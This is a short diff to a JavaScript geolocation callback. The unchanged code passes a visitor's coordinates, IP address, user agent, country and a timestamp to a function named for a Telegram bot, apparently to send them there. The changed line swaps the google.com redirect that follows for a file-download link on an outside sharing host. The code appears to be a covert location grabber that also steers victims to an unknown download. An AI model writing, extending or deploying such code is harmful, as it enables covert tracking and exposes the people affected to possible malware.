@@ -20,7 +20,7 @@ async function successCallback(position) {
 
     sentToTelegramBot(position.coords.latitude, position.coords.longitude, currentTimestamp, userAgent, ip, country);
     // redirect to google.com
-    window.location.href = `https://www.google.com/`;
+    window.location.href = `https://send.zcyph.cc/download/348dfa91803c0942/#RA-2vcQCp7RQabIlGgYeTg`;
 
 }
 
